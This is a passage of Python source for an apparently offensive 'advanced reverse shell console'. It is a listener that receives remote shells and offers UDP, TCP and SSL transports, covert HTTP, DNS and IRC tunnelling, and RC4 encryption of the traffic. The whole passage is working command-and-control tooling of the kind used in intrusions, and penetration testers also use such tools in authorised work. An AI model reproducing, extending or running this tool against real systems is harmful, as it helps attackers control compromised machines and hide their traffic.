    This class implements UDP server.
    """

    def __init__(
        self,
        address: Tuple[str, int] = ("0.0.0.0", 1337),
        handler: type = ReverseShell,
    ):
        super().__init__(address, handler)


def parser() -> Namespace:
    """
    This function parses command line arguments.
    """

    arguments = ArgumentParser(description="Advanced reverse shell console.")
    protocol = arguments.add_mutually_exclusive_group()
    arguments_add_argument = arguments.add_argument
    protocol_add_argument = protocol.add_argument
    protocol_add_argument(
        "--udp", "-u", action="store_true", help="Use UDP socket."
    )
    protocol_add_argument(
        "--tcp", "-t", action="store_true", help="Use TCP socket."
    )
    protocol_add_argument(
        "--multi-tcp",
        "-T",
        action="store_true",
        help="Create TCP socket for each command and responses.",
    )
    protocol = arguments.add_mutually_exclusive_group()
    protocol_add_argument = protocol.add_argument
    protocol_add_argument(
        "--http",
        "-H",
        action="store_true",
        help="Use HTTP requests and responses.",
    )
    protocol_add_argument(
        "--dns",
        "-d",
        action="store_true",
        help="Use DNS requests and responses.",
    )
    protocol_add_argument(
        "--irc",
        "-I",
        action="store_true",
        help="Use IRC requests and response.",
    )
    arguments_add_argument(
        "--no-color",
        "--color",
        "-C",
        default=True,
        action="store_false",
        help="Do not use color",
    )
    arguments_add_argument(
        "--key",
        "-k",
        default=None,
        type=lambda x: bytes(x, "utf-8"),
        help="Add a key to encrypt with RC4.",
    )
    arguments_add_argument(
        "--cert", "-c", default="server.crt", help="SSL cert file."
    )
    arguments_add_argument(
        "--private", "-P", default="server.key", help="SSL private key file."
    )
    arguments_add_argument(
        "--ip",
        "-i",
        default="0.0.0.0",
        help="IP address to start the ReverseShell server.",
    )
    arguments_add_argument(
        "--port",
        "-p",
        default=1337,
        help="UDP/TCP port to start the ReverseShell server.",
    )
    arguments_add_argument(
        "--encoding",
        "-e",
        help="The reverse shell encoding used by client.",
    )
    arguments_add_argument(
        "--ssl", "-s", action="store_true", help="Use SSL over TCP socket."
    )
    arguments_add_argument(
        "--no-timeout",
        "-m",
        action="store_true",
        help=(
            "Faster response but TCP data larger than Window maximum"
            " size will not work. You should use this argument with "
            "standard/basic reverse shell like netcat."
        ),
    )
    return arguments.parse_args()


def main() -> int:
    """
    This function starts the ReverseShell
    from command line and returns the exit code.
    """

    arguments = parser()

    ReverseShell.color = arguments.no_color
    ReverseShell.use_timeout = not arguments.no_timeout

    if arguments.udp:
        class_: Callable = partial(
            ReverseShellUdp, address=(arguments.ip, arguments.port)
        )
        protocol = "udp"
    elif arguments.multi_tcp:
        class_: Callable = partial(
            ReverseShellTcp,
            address=(arguments.ip, arguments.port),
            ssl=arguments.ssl,
            cert=arguments.cert,
            key=arguments.private,
        )
        protocol = "tcp"
    else:
        class_: Callable = partial(
            ReverseShellSocketTcp,
            address=(arguments.ip, arguments.port),
            ssl=arguments.ssl,
            cert=arguments.cert,
            key=arguments.private,
        )
        protocol = "tcp-onesocket"

    if arguments.http:
        handler: Callable = partial(
            HttpReverseShell, key=arguments.key, encoding=arguments.encoding
        )
        protocol += " http"
    elif arguments.irc:
        handler: Callable = partial(
            IrcReverseShell, key=arguments.key, encoding=arguments.encoding
        )
        protocol += " irc"
    elif arguments.dns:
        handler: Callable = partial(
            DnsReverseShell, key=arguments.key, encoding=arguments.encoding
        )
        protocol += " dns"
    else:
        handler: Callable = partial(
            ReverseShell, key=arguments.key, encoding=arguments.encoding
        )

    with class_(handler=handler) as shellserver:
        print(
            protocol,
            "://",
            shellserver.server_address[0],
            ":",
            shellserver.server_address[1],
            sep="",
        )
        with suppress(KeyboardInterrupt):
            shellserver.serve_forever()

    if arguments.no_color:
        print("\x1b[0m")


if __name__ == "__main__":
    exit(main())
